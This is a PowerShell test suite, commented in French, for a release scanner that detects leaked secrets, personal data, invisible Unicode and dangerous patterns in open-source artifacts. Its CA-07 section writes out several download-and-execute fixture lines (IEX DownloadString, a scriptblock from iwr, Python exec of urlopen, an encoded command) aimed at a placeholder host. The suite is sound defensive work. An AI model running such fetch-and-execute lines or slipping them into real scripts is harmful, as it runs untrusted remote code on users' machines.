param([string]$Gitleaks = $env:GITLEAKS_PATH)
# Tests hostiles de check-release.ps1 (contre-audit du 26/11/2026, failles CA-02 à CA-05).
# Données 100 % fictives générées à la volée, dossiers temporaires supprimés en fin d'exécution.
# Usage : powershell -NoProfile -File tests/test-check-release.ps1 -Gitleaks <chemin de gitleaks.exe>
$ErrorActionPreference = 'Stop'
$scanner = Join-Path $PSScriptRoot '..\skills\github-open-source-release\scripts\check-release.ps1'
if (!$Gitleaks -or !(Test-Path -LiteralPath $Gitleaks)) { Write-Output 'SKIP : gitleaks introuvable (paramètre -Gitleaks ou GITLEAKS_PATH).'; exit 2 }
$env:GITLEAKS_PATH = $Gitleaks
$root = Join-Path ([IO.Path]::GetTempPath()) ('ct-check-release-' + [guid]::NewGuid().ToString('N').Substring(0, 8))
$utf8 = New-Object System.Text.UTF8Encoding($false)
Add-Type -AssemblyName System.IO.Compression.FileSystem
$userPath = 'C:' + '\Us' + 'ers\jdupont\Documents'          # chemin privé fictif, assemblé pour ne pas se signaler lui-même
$canaryUserPath = 'C:' + '\Us' + 'ers\CANARY_TEST_user\Documents'
$personalMail = 'jean.dupont' + '@' + 'gmail.com'
$failures = 0; $count = 0

function New-Case([string]$name) {
  $d = Join-Path $root $name; New-Item -ItemType Directory -Force $d | Out-Null
  [IO.File]::WriteAllText((Join-Path $d 'README.md'), "# Projet fictif`n", $utf8); return $d
}
function W([string]$dir, [string]$rel, [string]$text) {
  $p = Join-Path $dir $rel; New-Item -ItemType Directory -Force (Split-Path $p) | Out-Null; [IO.File]::WriteAllText($p, $text, $utf8)
}
function New-Zip([string]$dir, [string]$name, [hashtable]$files) {
  $src = Join-Path $root ('zipsrc-' + [guid]::NewGuid().ToString('N').Substring(0, 6)); New-Item -ItemType Directory $src | Out-Null
  foreach ($k in $files.Keys) { W $src $k $files[$k] }
  [IO.Compression.ZipFile]::CreateFromDirectory($src, (Join-Path $dir $name))
}
function Expect([string]$label, [string]$dir, [string]$expected, [string]$gitRoot) {
  $script:count++
  $scanArgs = @('-NoProfile', '-File', $scanner, '-ArtifactPath', $dir)
  $scanArgs += if ($gitRoot) { @('-GitRoot', $gitRoot) } else { @('-Fast') }
  $out = (& powershell @scanArgs 2>&1 | Out-String).Trim()
  $json = $out -split "`n" | Where-Object { $_ -match '^\{' } | Select-Object -Last 1
  $obj = $null; try { $obj = $json | ConvertFrom-Json } catch {}
  $got = if ($obj.status -eq 'passed') { 'passed' } elseif ($obj) { "$($obj.stage)/$($obj.reason)" } else { 'erreur' }
  $ok = if ($expected -eq 'passed') { $got -eq 'passed' } else { $got -eq $expected }
  if ($out.Contains($personalMail) -or $out.Contains('jdupont')) { $ok = $false; $got += ' (valeur affichée !)' }
  if ($ok) { Write-Output "PASS $label" } else { $script:failures++; Write-Output "FAIL $label : obtenu $got, attendu $expected" }
}

try {
  New-Item -ItemType Directory $root | Out-Null
  # Témoins
  $d = New-Case 'temoin'; W $d 'app.py' "print('ok')`n"; Expect 'témoin propre' $d 'passed'
  $d = New-Case 'binaire'; [IO.File]::WriteAllBytes((Join-Path $d 'image.png'), [byte[]](0x89, 0x50, 0x4E, 0x47, 0, 0, 0, 13, 0, 1, 2, 3)); Expect 'image binaire ignorée' $d 'passed'
  $d = New-Case 'gros-binaire'; $fs = [IO.File]::Create((Join-Path $d 'video.mp4')); $fs.SetLength(11MB); $fs.Dispose(); Expect 'gros fichier binaire ignoré' $d 'passed'

  # CA-02 : fichiers de secrets reconnus par leur nom
  foreach ($f in @('id_rsa', 'id_ed25519', 'credentials.json', 'service-account-prod.json', '.git-credentials', '.netrc', 'secrets.yaml', 'secrets.json', 'client.p12', 'app.keystore', '.ssh/config', '.aws/credentials')) {
    $d = New-Case ('nom-' + ($f -replace '[^a-z0-9]', '_')); W $d $f "valeur=fictive`n"; Expect "CA-02 nom $f" $d 'artifact-layout/private-entry'
  }
  $d = New-Case 'nom-legit'; W $d 'docs/credentials-guide.md' "# Guide`n"; W $d 'id_rsa.pub' "ssh-ed25519 AAAA fictive`n"; Expect 'CA-02 témoin : guide et clé publique acceptés' $d 'passed'

  # CA-03 : contenu des archives et documents Office dans un dossier
  $d = New-Case 'zip-chemin'; New-Zip $d 'docs.zip' @{ 'notes.md' = "Voir $userPath`n" }; Expect 'CA-03 chemin privé dans un ZIP' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'docx-mail'; New-Zip $d 'rapport.docx' @{ 'word/document.xml' = "<w:t>$personalMail</w:t>" }; Expect 'CA-03 e-mail dans un .docx' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'zip-renomme'; New-Zip $d 'sauvegarde.bak' @{ 'notes.md' = "Voir $userPath`n" }; Expect 'CA-03 ZIP renommé en .bak' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'zip-docx'; $inner = Join-Path $root 'innerdocx'; New-Item -ItemType Directory $inner | Out-Null; New-Zip $inner 'a.docx' @{ 'word/document.xml' = "<w:t>$personalMail</w:t>" }; [IO.Compression.ZipFile]::CreateFromDirectory($inner, (Join-Path $d 'lot.zip')); Expect 'CA-03 .docx dans un ZIP' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'zip-unicode'; New-Zip $d 'src.zip' @{ 'a.js' = ("const ok = 1;" + [char]0x200B + "`n") }; Expect 'CA-03 Unicode invisible dans un ZIP' $d 'artifact-sast/sast-invisible-unicode'
  $d = New-Case 'zip-casse'; [IO.File]::WriteAllBytes((Join-Path $d 'faux.zip'), [byte[]](0x50, 0x4B, 3, 4, 1, 2, 3)); Expect 'CA-03 archive illisible refusée' $d 'artifact-dlp/unscannable-archive'

  # CA-04 : le marqueur CANARY_TEST_ n'exempte plus une vraie donnée
  $d = New-Case 'canary-mail'; W $d 'fixture.md' "CANARY_TEST_ contact : $personalMail`n"; Expect 'CA-04 e-mail réel sur une ligne CANARY' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'canary-chemin'; W $d 'fixture.md' "CANARY_TEST_ dossier : $userPath`n"; Expect 'CA-04 chemin réel sur une ligne CANARY' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'canary-ok'; W $d 'fixture.md' ("CANARY_TEST_ dossier : $canaryUserPath`nCANARY_TEST_ mail : canary_test_user@gmail.com et x@example.test`nIBAN fictif FR76 3000 6000 0112 3456 7890 189 CANARY_TEST_`n"); Expect 'CA-04 témoin : vraies fixtures CANARY acceptées' $d 'passed'

  # CA-05 : fichiers texte que le contrôle ignorait en silence
  $d = New-Case 'utf16'; [IO.File]::WriteAllText((Join-Path $d 'notes.txt'), "Voir $userPath`r`n", [Text.Encoding]::Unicode); Expect 'CA-05 texte UTF-16' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'utf16-sans-bom'; [IO.File]::WriteAllBytes((Join-Path $d 'notes.txt'), [Text.Encoding]::Unicode.GetBytes("Contact $personalMail`r`n")); Expect 'CA-05 texte UTF-16 sans BOM' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'octet-nul'; [IO.File]::WriteAllBytes((Join-Path $d 'notes.md'), [byte[]](@(0) + [Text.Encoding]::UTF8.GetBytes("`nVoir $userPath`n"))); Expect 'CA-05 octet nul en tête d''un .md' $d 'artifact-dlp/dlp-private-path'
  # Clés cachées là où gitleaks ne regarde pas (format fictif généré à la volée)
  $token = 'gh' + 'p_' + (-join (1..36 | ForEach-Object { 'abcdefghijklmnopqrstuvwxyz0123456789'[(Get-Random -Maximum 36)] }))
  $d = New-Case 'cle-utf16'; [IO.File]::WriteAllText((Join-Path $d 'notes.txt'), "TOKEN=$token`r`n", [Text.Encoding]::Unicode); Expect 'CA-05 clé dans un texte UTF-16' $d 'artifact-dlp/secret-pattern'
  $d = New-Case 'cle-docx'; New-Zip $d 'acces.docx' @{ 'word/document.xml' = "<w:t>$token</w:t>" }; Expect 'CA-03 clé dans un .docx' $d 'artifact-dlp/secret-pattern'
  $d = New-Case 'cle-bak'; New-Zip $d 'vieux.bak' @{ 'cfg.txt' = "TOKEN=$token`n" }; Expect 'CA-03 clé dans une archive renommée' $d 'artifact-dlp/secret-pattern'
  # CA-06 : chemins privés sur un autre disque ou un partage réseau
  $d = New-Case 'autre-disque'; W $d 'notes.md' ("Factures dans D:" + "\Clients\Dupont SARL\2026`n"); Expect 'CA-06 dossier client sur un autre disque' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'onedrive'; W $d 'notes.md' ("Copie dans F:" + "\OneDrive\Documents\paie.xlsx`n"); Expect 'CA-06 OneDrive sur un autre disque' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'unc'; W $d 'notes.md' ("Partage \\" + "SERVEUR-MAX\paie\janvier`n"); Expect 'CA-06 partage réseau nommé' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'chemins-neutres'; W $d 'doc.md' ("Exemples : C:\Windows\System32, C:\Program Files\App, C:\chemin\racine-autorisee, D:\data\exemple.txt, \\" + "localhost\c$\Windows, \\" + "?\C:\Windows, \\" + ".\NUL, //serveur/partage/fichier.txt`n"); Expect 'CA-06 témoin : chemins système et exemples acceptés' $d 'passed'

  # CA-07 : autres formes de téléchargement-exécution et extensions de scripts
  $dl = 'https://exemple.invalid/x'
  $d = New-Case 'downloadstring'; W $d 'setup.ps1' ("I" + "EX (New-Object Net.WebClient).Download" + "String('$dl')`n"); Expect 'CA-07 DownloadString exécuté' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'scriptblock'; W $d 'setup.ps1' ("& ([script" + "block]::Create((i" + "wr $dl).Content))`n"); Expect 'CA-07 scriptblock téléchargé' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'python-exec'; W $d 'run.py' ("import urllib.request`nex" + "ec(urllib.request.url" + "open('$dl').read())`n"); Expect 'CA-07 exec Python d''un téléchargement' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'encoded'; W $d 'run.ps1' ("powershell -Encoded" + "Command SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcABzADoA`n"); Expect 'CA-07 commande encodée' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'bat'; W $d 'install.bat' ("powershell -c `"i" + "ex (i" + "rm $dl)`"`n"); Expect 'CA-07 téléchargement-exécution dans un .bat' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'sast-neutre'; W $d 'tools.ps1' "Invoke-WebRequest -Uri '$dl' -OutFile x.zip`nGet-FileHash x.zip`n"; Expect 'CA-07 témoin : simple téléchargement de fichier accepté' $d 'passed'

  # CA-11 : caractères invisibles supplémentaires et mélange d'alphabets
  $d = New-Case 'word-joiner'; W $d 'a.js' ("const ok = 1;" + [char]0x2060 + "`n"); Expect 'CA-11 U+2060 invisible' $d 'artifact-sast/sast-invisible-unicode'
  $d = New-Case 'bom-milieu'; W $d 'a.js' ("const a = 1;" + [char]0xFEFF + "`n"); Expect 'CA-11 U+FEFF au milieu du fichier' $d 'artifact-sast/sast-invisible-unicode'
  $d = New-Case 'homoglyphe'; W $d 'a.js' ("const p" + [char]0x0430 + "ssword = 1;`n"); Expect 'CA-11 identifiant latin et cyrillique mélangés' $d 'artifact-sast/sast-homoglyph'
  $d = New-Case 'cyrillique-ok'; W $d 'README.md' ("Привет : bonjour en russe.`n"); Expect 'CA-11 témoin : texte russe dans la documentation accepté' $d 'passed'

  # CA-12 : téléphone portable et e-mail dans un nom de fichier
  $phone = '06 12' + ' 34 56 78'   # numéro fictif, assemblé pour ne pas se signaler lui-même
  $d = New-Case 'telephone'; W $d 'contact.md' "Tél. : $phone`n"; Expect 'CA-12 numéro de portable' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'telephone-intl'; W $d 'contact.md' ("Tel +33 7" + " 12 34 56 78`n"); Expect 'CA-12 numéro de portable international' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'mail-nom'; [IO.File]::WriteAllText((Join-Path $d ('export-' + $personalMail + '.csv')), "a;b`n", $utf8); Expect 'CA-12 e-mail dans un nom de fichier' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'mail-nom-vide'; New-Item -ItemType File (Join-Path $d ('vide-' + $personalMail + '.txt')) | Out-Null; Expect 'CA-12 e-mail dans le nom d''un fichier vide' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'dossiers-internes'; W $d 'doc.md' ("Copies : ~/.codex/skills, `$HOME/.gemini/config, %USERPROFILE%\.memento\x et `$env:USERPROFILE\.codex\y`n"); Expect 'Témoin : dossiers internes écrits avec ~ ou une variable acceptés' $d 'passed'
  $d = New-Case 'gitignore-interne'; W $d '.gitignore' "/.memento/`n.codex/`n.gemini/`n"; W $d 'doc.md' "Copies dans ``.codex/skills/`` et ``.agents/skills/``.`n"; Expect 'Témoin : dossiers internes nommés seuls (.gitignore, doc) acceptés' $d 'passed'
  $d = New-Case 'dossier-interne-absolu'; W $d 'doc.md' ("Base : D:\Projets\app\." + "memento\db`n"); Expect 'Dossier interne sous un chemin absolu' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'nombres-ok'; W $d 'notes.md' "Version 0612.3456, ticket 0612345678901, date 06/12/2026`nCANARY_TEST_ tél. 06 00 00 00 00`n"; Expect 'CA-12 témoin : nombres ordinaires et téléphone fictif acceptés' $d 'passed'

  # CA-08 : données personnelles restées dans l'historique Git (mode complet)
  function New-Repo([string]$name) {
    $r = Join-Path $root $name; New-Item -ItemType Directory $r | Out-Null
    git -C $r init -q -b main; git -C $r config user.name 'CANARY_TEST'; git -C $r config user.email '1+canary@users.noreply.github.com'; git -C $r config commit.gpgsign false
    return $r
  }
  function New-Candidate([string]$repo) {
    $c = "$repo-candidat"; New-Item -ItemType Directory $c | Out-Null
    foreach ($x in @(git -C $repo ls-files)) { $dst = Join-Path $c $x; New-Item -ItemType Directory -Force (Split-Path $dst) | Out-Null; Copy-Item -LiteralPath (Join-Path $repo $x) $dst }
    return $c
  }
  $r = New-Repo 'git-chemin'; W $r 'n.md' "Voir $userPath`n"; git -C $r add -A; git -C $r commit -q -m 'a'; W $r 'n.md' "propre`n"; git -C $r add -A; git -C $r commit -q -m 'b'
  Expect 'CA-08 chemin privé effacé mais resté dans l''historique' (New-Candidate $r) 'git-dlp/dlp-private-path' $r
  $r = New-Repo 'git-message'; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m "Jeton de secours $token"
  Expect 'CA-08 clé écrite dans un message de commit' (New-Candidate $r) 'git-dlp/secret-pattern' $r
  $r = New-Repo 'git-tel'; W $r 'c.md' "Tél. $phone`n"; git -C $r add -A; git -C $r commit -q -m 'a'; git -C $r rm -q c.md; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m 'b'
  Expect 'CA-08 numéro effacé mais resté dans l''historique' (New-Candidate $r) 'git-dlp/dlp-pii' $r
  $r = New-Repo 'git-propre'; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m 'Initial'
  Expect 'CA-08 témoin : historique propre accepté' (New-Candidate $r) 'passed' $r

  # Tranche 3 : mot de passe écrit en dur et jeton dans un fichier de configuration de paquets
  $pw = 'Soud' + 'ure2026!'   # valeur fictive assemblée pour ne pas se signaler elle-même
  $d = New-Case 'pw-python'; W $d 'settings.py' ("PASS" + "WORD = '$pw'`n"); Expect 'T3 mot de passe en dur (Python)' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'pw-js'; W $d 'db.js' ("const db" + "Password = `"$pw`";`n"); Expect 'T3 mot de passe en dur (JavaScript)' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'pw-json'; W $d 'config.json' ("{ `"api" + "_key`": `"$pw-abc`" }`n"); Expect 'T3 clé en dur (JSON)' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'pw-yaml'; W $d 'app.yml' ("sec" + "ret: $pw`n"); Expect 'T3 secret en dur (YAML)' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'npmrc'; W $d '.npmrc' ("//registry.npmjs.org/:_auth" + "Token=" + "npm_" + "fictif1234567890`n"); Expect 'T3 jeton dans .npmrc' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'pypirc'; W $d '.pypirc' ("[pypi]`nusername = __token__`npass" + "word = " + "pypi-" + "fictif1234567890`n"); Expect 'T3 jeton dans .pypirc' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'pw-neutres'; W $d 'cfg.py' ("PASS" + "WORD = os.environ['DB_PASSWORD']`ntoken = os.getenv('TOKEN')`npassword = ''`napi_key = '<votre-clé>'`nsecret = '" + '${SECRET}' + "'`npassword = 'changeme'`npassword_field = 'mot de passe'`n"); W $d 'README.md' "Le mot de passe doit faire 12 caractères ; password: voir le gestionnaire.`n"; W $d '.npmrc' "registry=https://registry.npmjs.org/`n//registry.npmjs.org/:_authToken=`${NPM_TOKEN}`n"
  Expect 'T3 témoin : variables d''environnement, valeurs vides et exemples acceptés' $d 'passed'
  $d = New-Case 'pw-canary'; W $d 'test_auth.py' ("password = 'CANARY_TEST_motdepasse'`n"); Expect 'T3 témoin : mot de passe fictif CANARY_TEST_ accepté' $d 'passed'

  $d = New-Case 'gros-texte'; $sb = New-Object Text.StringBuilder; [void]$sb.Append(('x' * 100 + "`n") * 105000); [IO.File]::WriteAllText((Join-Path $d 'journal.log'), $sb.ToString()); Expect 'CA-05 fichier texte > 10 Mo refusé' $d 'artifact-dlp/unscanned-text-file'
} finally {
  Remove-Item -Recurse -Force -LiteralPath $root -ErrorAction SilentlyContinue
}
Write-Output "RÉSULTAT : $($count - $failures)/$count conformes"
if ($failures) { exit 1 }
